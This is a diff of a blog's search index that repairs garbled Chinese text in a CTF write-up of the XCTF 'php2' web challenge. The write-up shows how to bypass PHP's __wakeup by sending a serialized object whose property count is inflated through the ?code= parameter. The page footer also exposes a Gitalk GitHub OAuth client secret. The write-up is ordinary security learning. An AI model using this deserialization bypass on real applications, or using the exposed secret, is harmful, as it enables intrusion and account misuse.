@@ -1,37 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTF��������-WEB-php2</title>
+    <title>CTF攻防世界-WEB-php2</title>
     <url>/2019/12/31/ctf-web-php2/</url>
-    <content><![CDATA[<div class="note info"><p>0x01 ǰҪ</p></div>
-1.PHP���л��뷴���л� </br>
+    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
+1.PHP序列化与反序列化 </br>
 
 
 <a id="more"></a>
 
-<div class="note info"><p>0x02 ����������˼·</p></div>
-1.����ҳ��Ŀ¼������ע��Ҳûʲô�仯����������
+<div class="note info"><p>0x02 解题流程与思路</p></div>
+1.打开网页，目录遍历，注入也没什么变化，分析代码
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>
 
-<p>2.����������ν����ѧ���������������ĺ�����������<br> 2_1.�������ǵĹ�ע�� _wakeup(),һ���Ȼ����㶫������ϸ��˵�����Կ��Ҹ��Ĳο����������÷����л��ƹ�wakeup���flag��</p>
+<p>2.懂不懂无所谓，边学边做，看见不懂的函数，查它！<br> 2_1.所以我们的关注点 _wakeup(),一查果然查出点东西，详细的说明可以看我给的参考，此题利用反序列化绕过wakeup获得flag。</p>
  </br>
-3.��Դ������мӹ�
+3.对源代码进行加工
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> = <span class="string">'111'</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = new xctf();</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
 
 </br>
- 3_1.��дphp�ļ����´�,�ó����
+ 3_1.改写php文件重新打开,得出结果
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:1:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>4.�õ����У�����wakeup�ƹ�ԭ���������д��ʹ����������ʵ���Բ�����Ȼ�����depoly�õ�flag��</p>
+<p>4.得到序列，根据wakeup绕过原理，随意改写，使得属性与真实属性不符。然后进行depoly得到flag。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>====&gt;���¹���</p>
+<p>====&gt;重新构造</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?code=O:4:<span class="string">"xctf"</span>:2:&#123;s:4:<span class="string">"flag"</span>;s:3:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure></div>
 
 
 <br>
-<div class="note info"><p>0x03 �ο�</p></div>
-1.<a href='https://www.php.net/manual/zh/language.oop5.serialization.php' target="_blank">���л����� - �ڻỰ�д�Ŷ���:https://www.php.net/manual/zh/language.oop5.serialization.php</a><br>
+<div class="note info"><p>0x03 参考</p></div>
+1.<a href='https://www.php.net/manual/zh/language.oop5.serialization.php' target="_blank">序列化对象 - 在会话中存放对象:https://www.php.net/manual/zh/language.oop5.serialization.php</a><br>
 
 
 
@@ -42,19 +42,19 @@
 <br>
 <br>
 
-<!-- Link Gitalk ��֧���ļ�  -->
+<!-- Link Gitalk 的支持文件  -->
 <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
 <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
 <div id="gitalk-container"></div>     <script type="text/javascript">
     var gitalk = new Gitalk({
 
-<pre><code>// gitalk����Ҫ����
+<pre><code>// gitalk的主要参数
     clientID: &apos;dcf239aa6b46fcf244a3&apos;,
     clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
     repo: &apos;MR-eggegg.github.io&apos;,
     owner: &apos;MR-eggegg&apos;,
     admin: [&apos;MR-eggegg&apos;],
-    id: &apos;ҳ���Ψһ��ʶ��gitalk����������ʶ�Զ�������issue�ı�ǩ&apos;,
+    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,
 
 });
 gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
@@ -63,7 +63,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
         <category>CTF-WEB</category>
       </categories>
       <tags>
-        <tag>PHP���л��뷴���л���ħ������</tag>
+        <tag>PHP序列化与反序列化：魔术方法</tag>
       </tags>
   </entry>
   <entry>
